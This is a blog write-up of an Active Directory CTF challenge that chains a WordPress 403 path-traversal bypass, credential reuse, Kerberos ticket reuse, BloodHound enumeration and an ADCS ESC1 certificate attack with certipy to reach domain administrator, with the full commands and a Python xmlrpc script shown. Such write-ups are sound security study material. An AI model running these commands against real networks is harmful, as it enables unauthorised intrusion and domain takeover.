<!doctype html><html lang=en><head><title>P3RF3CT R00T CTF 2024 Writeup - Active Directory ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><meta name=twitter:card content="summary"><meta name=twitter:title content="P3RF3CT R00T CTF 2024 Writeup - Active Directory"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="P3RF3CT R00T CTF 2024 Writeup - Active Directory"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2024-11-17 02:10:36 +0300 +0300"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/>P3RF3CT R00T CTF 2024 Writeup - Active Directory</a></h1><div class=post-meta><time class=post-date>2024-11-17 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/wordpress/>WordPress</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wpscan/>WPScan</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/403-bypass/>403 Bypass</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/active-directory/>Active Directory</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/netexec/>NetExec</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/bloodhound/>BloodHound</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/certipy/>Certipy</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/adcs-esc1/>ADCS ESC1</a>&nbsp;</span><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#attack>Attack</a><ul><li><a href=#wordstress-flag>WordStress Flag</a></li><li><a href=#calm-belt-flag>Calm Belt Flag</a></li><li><a href=#marinford-degree-flag>Marinford Degree Flag</a></li></ul></li><li><a href=#extras>Extras</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><div class=post-content><div><img src=/img/p3rf3ctr00t_ctf_2024/ctf_logo.jpg class=center style=border-radius:8px><h2 id=introduction>Introduction<a href=#introduction class=hanchor arialabel=Anchor>&#8983;</a></h2><p>This weekend I had some fun participating in the P3RF3CTR00T CTF 2024 by <a href=https://twitter.com/p3rf3ctr00t target=_blank rel=noopener>p3rf3ctr00t</a>
ctf team, barely got some sleep. They really did a good job considering it&rsquo;s their first edition of the CTF, I didn&rsquo;t experience any downtime and support was very helpful on their discord server. They had over 50 challenges!</p><p>Kudos to them, I am happy to see an evolution of CTFs in the Kenyan hacking scene. I have been playing CTFs for a while and this one gave me a fun challenge, at some point I was number 1. I was playing solo under <strong>NoPwnNoGain</strong>.</p><p>Alright, let&rsquo;s get into the writeup. The AD category was a challenge to everyone, even after 24 hrs I was the only solver. Later, on there were additional solves but no one else got DA :).</p><h2 id=attack>Attack<a href=#attack class=hanchor arialabel=Anchor>&#8983;</a></h2><p>We start of with the challenge information. Important info here is the IP and the Artifact.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_1.png class=center style=border-radius:8px><p>We begin by running a full portscan on the target.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_2.png class=center style=border-radius:8px><p>We only get port 22 and 80 open, on port 80 we have a Wordpress site.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_3.png class=center style=border-radius:8px><p>I fired up wpscan, to get recon going as I clicked around the site to see what was posted.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wpscan --url http://154.12.228.253/ -e ap,at,tt,cb,dbe,u --api-token --redacted-- -o wpscan.out
</span></span></code></pre></div><p>From the scan, the only notable finding was the discovered user, we could also see the username on the site from a published post.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_4.png class=center style=border-radius:8px><p>After recon, the only logical next step was to target this user. Remember the <strong>Artifact - Winterseason1234</strong> from the challenge info? Let&rsquo;s test it as the password for this account.</p><p>Unfortunately, when we try accessing /wp-admin we are forbidden. Based on the output, there&rsquo;s a proxy blocking this access.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_5.png class=center style=border-radius:8px><p>So how do we test the credentials? Since I remember xmlrpc was accessible based on the wpscan output, I used metasploit&rsquo;s <code>wordpress_xmlrpc_login</code> module to check if the password is valid.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_6.png class=center style=border-radius:8px><p>Now that we confirm the password is valid, what next? We can&rsquo;t access wp-admin.</p><p>I got stuck here for some time doing various things against wordpress, I tried scanning again to see if I missed anything. I tried using xmlrpc to make modifications on the site but it has very limited functionality. Without much success, I decided that finding a bypass so as to access wp-admin was the only way forward.</p><p>I tried several bypasses such as adding X-Forwared-For headers but no dice. Finally a little trickery with the URL worked.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_7.png class=center style=border-radius:8px><p>By using path traversal, I was able to bypass the proxy and get to Wordpress. As you can see we no longer get 403 Forbidden.</p><p>The next step is to make sure I can comfortably do this on the browser. Burp&rsquo;s Match and Replace for the win.</p><p>I added the following rule that ensures, whenever I use <code>/wp-admin</code> on the browser, Burp would replace it with <code>/wp-content/../wp-admin</code> and forward it to the server.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_8.png class=center style=border-radius:8px><p>To make things smoother, I did the same for wp-login.php as well.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_9.png class=center style=border-radius:8px><p>Now we can comfortably login to wp-admin.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_10.png class=center style=border-radius:8px>
<img src=/img/p3rf3ctr00t_ctf_2024/wordstress_11.png class=center style=border-radius:8px><p>With access to the admin panel, getting a shell is straighforward. We can modify one of the theme files to include our php shell payload. I initially did this, but later realized I had skipped the intended path. So let&rsquo;s follow the intended path (which is easier).</p><h3 id=wordstress-flag>WordStress Flag<a href=#wordstress-flag class=hanchor arialabel=Anchor>&#8983;</a></h3><p>In the comments, there&rsquo;s one comment that is in the trash. This includes the WordStress flag and the password to crocodile on the host.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_12.png class=center style=border-radius:8px><p>WordStress Flag: <code>r00t{well_lif3_1s_T00_h4rD_w1d_p0xies_pixies}</code></p><p>We can now comfortably ssh into the box. The important bit, was to ensure we specify the domain. This was not a local user but a user on Active Directory.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_13.png class=center style=border-radius:8px><p>This was easier for me since I initially got access to the box via a reverse shell and discovered the domain name.</p><p>I would imagine, it wouldn&rsquo;t have been so intuitive to provide the domain name on the first try. Even though on the comment we are given some sort of hint, I bet it wouldn&rsquo;t have been a quick thing to figure out.</p><h3 id=calm-belt-flag>Calm Belt Flag<a href=#calm-belt-flag class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Once logged in we have access to the next flag.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_14.png class=center style=border-radius:8px><p>Flag: <code>r00t{Th3_calm_b3lt_isnt_s0_calm}</code></p><p>After some local recon, the next step seemed to point to attacking Active Directory no need for privesc to root.</p><p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_15.png class=center style=border-radius:8px>
<img src=/img/p3rf3ctr00t_ctf_2024/wordstress_16.png class=center style=border-radius:8px></p><p>We now have the IP of what could be Domain Controller as that&rsquo;s where our DNS is pointed to. I&rsquo;ll use this linux box to proxy traffic to the DC and attack directly from my local kali machine.</p><p>Let&rsquo;s setup a socks proxy over SSH.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ssh -D <span style=color:#ae81ff>1080</span> <span style=color:#e6db74>&#39;crocodile@grandline.local&#39;</span>@154.12.228.253
</span></span></code></pre></div><p>I&rsquo;ll point my proxychains config to 127.0.0.1 1080 and everything is all set. I&rsquo;ll begin by using netexec as it has a lot of good features built-in.</p><p>I am able to confirm that the IP we have is indeed for the domain controller and the credentials for the crocodile user are valid for the domain.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_17.png class=center style=border-radius:8px><p>Now let&rsquo;s do some more recon on the domain.</p><h4 id=domain-users>Domain Users:<a href=#domain-users class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p <span style=color:#e6db74>&#39;Cr0c0d1le_tears_lol1234&#39;</span> --users
</span></span></code></pre></div><p>There were many users present, but since the password for most of them were set in the same minute. I chose to consider only a few who were interesting and had different password set times meaning they could have some significance in the challenge.</p><ol><li>Administrator</li><li>krbtgt</li><li>sanji</li><li>crocodile</li><li>koala</li></ol><p>The user sanji is also present in the linux box.</p><h4 id=domain-computers>Domain Computers:<a href=#domain-computers class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p <span style=color:#e6db74>&#39;Cr0c0d1le_tears_lol1234&#39;</span> --computers
</span></span></code></pre></div><p>Only two are present.</p><ol><li>\calmbelt$ (our Linux box)</li><li>grandline.local\DC$ (the DC)</li></ol><h4 id=network-shares>Network Shares<a href=#network-shares class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p <span style=color:#e6db74>&#39;Cr0c0d1le_tears_lol1234&#39;</span> --shares
</span></span></code></pre></div><p>One of the network shares was interesting to me, since it&rsquo;s not usually present by default. This signalled to me that we have ADCS configured and it could potentially be our attack vector.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_18.png class=center style=border-radius:8px><h4 id=bloudhound>BloudHound<a href=#bloudhound class=hanchor arialabel=Anchor>&#8983;</a></h4><p>Netexec also has the option to collect data for use in bloodhound.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q netexec ldap 94.72.112.254 -u crocodile -p <span style=color:#e6db74>&#39;Cr0c0d1le_tears_lol1234&#39;</span> --bloodhound --dns-server 94.72.112.254 -c All
</span></span></code></pre></div><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_19.png class=center style=border-radius:8px><p>In bloodhound, when we look at the information about the interesting users we previously got. Sanji seems to have additional privileges on the Domain. He is part of the <code>Remote Management Users</code> group.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_20.png class=center style=border-radius:8px><p>This means, we may need to first get access as sanji. I remembered that during my local recon on the linux box there was a ccache file for sanji in /tmp.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_21.png class=center style=border-radius:8px><p>After downloading the file to my local machine, I imported the ccache file and could now use it for kerberos authentication auth as sanji. For netexec we need to specify <code>--use-kcache</code>.</p><p>proxychains -q netexec smb 94.72.112.254 &ndash;use-kcache</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_22.png class=center style=border-radius:8px><p>At this point, this was well and good but I still couldn&rsquo;t use this access to connect to the DC. So I switched to trying out ADCS. Since we noted it was present when we did recon on the available shares.</p><p>I used certipy and specified -old-bloodhound, so I can import the results into the bloodhound.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q certipy find -u crocodile@grandline.local -p <span style=color:#e6db74>&#39;Cr0c0d1le_tears_lol1234&#39;</span> -dc-ip 94.72.112.254 -old-bloodhound
</span></span></code></pre></div><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_23.png class=center style=border-radius:8px><p>From Bloodhound, we can see that we have 2 certificates that we can use for ESC1 attack.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_24.png class=center style=border-radius:8px><p>If we checked from our owned principals, we see that we can use sanji to abuse this.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_25.png class=center style=border-radius:8px><p>From certipy output (if you don&rsquo;t provide the -old-bloodhound option), we can confirm that sanji has rights on this certificate. This is also the challenge name, so it was a no brainer this was the intended path.</p><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_26.png class=center style=border-radius:8px><h3 id=marinford-degree-flag>Marinford Degree Flag<a href=#marinford-degree-flag class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Now we can exploit this and get administrator access and access the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q certipy req -k -ca grandline-DC-CA -target dc.grandline.local -template Marinford_Degree -upn administrator@grandline.local -dns-tcp -dc-ip 94.72.112.254
</span></span></code></pre></div><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_27.png class=center style=border-radius:8px><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
</span></span></code></pre></div><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_28.png class=center style=border-radius:8px><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
</span></span></code></pre></div><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_29.png class=center style=border-radius:8px><p>Flag: <code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}</code></p><h2 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h2><p>After finishing the CTF, I got this idea. Since I was playing around with xmlrpc, could we have just accessed the comment in trash using xmlrpc? Then we don&rsquo;t need to struggle with the 403 bypass. Even though xmlrpc functionality is limited. It can pretty much read most of the things on wordpress.</p><p>ChatGPT for the win. ChatGPT wrote for me this python script that I could use to read the hidden comment and flag. Awesome!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> xmlrpc.client
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># WordPress site XML-RPC URL</span>
</span></span><span style=display:flex><span>wp_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://154.12.228.253/xmlrpc.php&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># WordPress login credentials</span>
</span></span><span style=display:flex><span>wp_username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;crocodile&#34;</span>
</span></span><span style=display:flex><span>wp_password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Winterseason1234&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create the XML-RPC client</span>
</span></span><span style=display:flex><span>client <span style=color:#f92672>=</span> xmlrpc<span style=color:#f92672>.</span>client<span style=color:#f92672>.</span>ServerProxy(wp_url)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Define the parameters to get comments in the trash</span>
</span></span><span style=display:flex><span>comment_filter <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;status&#39;</span>: <span style=color:#e6db74>&#39;trash&#39;</span>,  <span style=color:#75715e># Filter comments with status &#39;trash&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Call the wp.getComments method</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    comments <span style=color:#f92672>=</span> client<span style=color:#f92672>.</span>wp<span style=color:#f92672>.</span>getComments(<span style=color:#ae81ff>0</span>, wp_username, wp_password, comment_filter)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Check if any comments are found</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> comments:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Comments in Trash:&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> comment <span style=color:#f92672>in</span> comments:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;ID: </span><span style=color:#e6db74>{</span>comment[<span style=color:#e6db74>&#39;comment_id&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Post ID: </span><span style=color:#e6db74>{</span>comment[<span style=color:#e6db74>&#39;post_id&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Author: </span><span style=color:#e6db74>{</span>comment[<span style=color:#e6db74>&#39;author&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Content: </span><span style=color:#e6db74>{</span>comment[<span style=color:#e6db74>&#39;content&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Date: </span><span style=color:#e6db74>{</span>comment[<span style=color:#e6db74>&#39;date_created_gmt&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>40</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;No comments found in the trash.&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> xmlrpc<span style=color:#f92672>.</span>client<span style=color:#f92672>.</span>Fault <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error occurred: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><img src=/img/p3rf3ctr00t_ctf_2024/wordstress_30.png class=center style=border-radius:8px><p>I&rsquo;m not sure the author knew this was possible. This is a clear indication that blocking access to the wp-admin portal doesn&rsquo;t really fully protect the wordpress instance, xmlrpc has some useful functionality! This is if you have valid credentials. Most online resources around attacking wordpress using xmlrpc don&rsquo;t really cover this.</p><p>There is potential to write an enum script that goes through xmlrpc if wp-admin is blocked. I hope you the reader can look into it. I surely will.</p><p>It tried using wp-json but I didn&rsquo;t succeed.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>&#8983;</a></h2><p>This was good challenge, cheers to the author <a href=https://x.com/byronchris25 target=_blank rel=noopener>Winter</a>
. Thanks for reading to the end!</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_mobile/><span class=button__text>NahamCon CTF 2024 WriteUp - Mobile</span>
<span class=button__icon>â†’</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2024 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>